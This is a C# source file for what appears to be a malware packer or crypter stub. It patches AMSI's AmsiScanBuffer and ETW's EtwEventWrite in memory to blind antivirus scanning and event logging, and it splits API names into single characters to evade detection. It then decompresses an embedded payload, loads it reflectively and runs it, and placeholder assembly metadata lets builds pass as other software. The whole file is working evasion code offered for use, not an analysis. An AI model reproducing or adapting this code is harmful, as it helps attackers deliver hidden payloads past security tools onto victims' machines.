using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Runtime.CompilerServices;

#if UseAssembly
[assembly: AssemblyTitle("%TITLE%")]
[assembly: AssemblyDescription("%DESC%")]
[assembly: AssemblyCompany("%COMPANY%")]
[assembly: AssemblyProduct("%PRODUCT%")]
[assembly: AssemblyCopyright("%COPYRIGHT%")]
[assembly: AssemblyTrademark("%TRADEMARK%")]
[assembly: AssemblyVersion("%VERSION%")]
[assembly: AssemblyFileVersion("%FILE_VERSION%")]
#endif

namespace PROPacker
{
    internal class PROXL05D
    {
        static void Main(string[] args)
        {
            try
            {
                Assembly.Load(new byte[0]);
            }
            catch
            {
                Patchers.Execute();
                byte[] decompressedBytes = Decompress(BridgeConf.HexPayload);
                BridgeRuntime.Execute(decompressedBytes);
            }
        }

        public static byte[] Decompress(byte[] compressedData)
        {
            using (var compressedStream = new MemoryStream(compressedData))
            using (var decompressionStream = new DeflateStream(compressedStream, CompressionMode.Decompress))
            using (var decompressedStream = new MemoryStream())
            {
                decompressionStream.CopyTo(decompressedStream);
                return decompressedStream.ToArray();
            }
        }
    }

    internal class BridgeRuntime
    {
        public static void Execute(byte[] decompressedBytes)
        {
            Assembly assembly = Assembly.Load(decompressedBytes);
            MethodInfo entryPoint = assembly.EntryPoint;
            if (entryPoint != null)
            {
                object[] parameters = entryPoint.GetParameters().Length == 0 ? null : new object[] { new string[] { } };
                entryPoint.Invoke(null, parameters);
            }
        }
    }

    internal class BridgeConf
    {
        public static byte[] HexPayload = new byte[] { };
    }

    public class Patchers
    {
        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr LoadLibraryA(string name);

        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr GetProcAddress(IntPtr hProcess, string name);

        [DllImport("kernel32", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        
        public static void AmsiPatch()
        {
            IntPtr library = LoadLibraryA("a" + "m" + "s" + "i" + "." + "d" + "l" + "l");
            IntPtr address = GetProcAddress(library, "A" + "m" + "s" + "i" + "S" + "c" + "a" + "n" + "B" + "u" + "f" + "f" + "e" + "r");
            if (address == IntPtr.Zero)
            {
                throw new InvalidOperationException("-1");
            }

            uint oldProtect;
            if (!VirtualProtect(address, (UIntPtr)5, 0x40, out oldProtect))
            {
                throw new InvalidOperationException("-1");
            }

            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            Marshal.Copy(patch, 0, address, patch.Length);
        }

        public static void EtwPatch()
        {
            byte[] PatchBytes = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            try
            {
                IntPtr ntdllLibrary = LoadLibraryA("n" + "t" + "d" + "l" + "l" + "." + "d" + "l" + "l");
                IntPtr EventName = GetProcAddress(ntdllLibrary, "Et" + "wE" + "ve" + "nt" + "Wr" + "it" + "e");
                if (EventName == IntPtr.Zero)
                {
                    throw new InvalidOperationException("-1");
                }

                uint previousProtection;
                if (!VirtualProtect(EventName, (UIntPtr)PatchBytes.Length, 0x40, out previousProtection))
                {
                    throw new InvalidOperationException("-1");
                }

                Marshal.Copy(PatchBytes, 0, EventName, PatchBytes.Length);
            }
            catch { }
        }

        public static void Execute()
        {
            EtwPatch();
            AmsiPatch();
        }
    }
}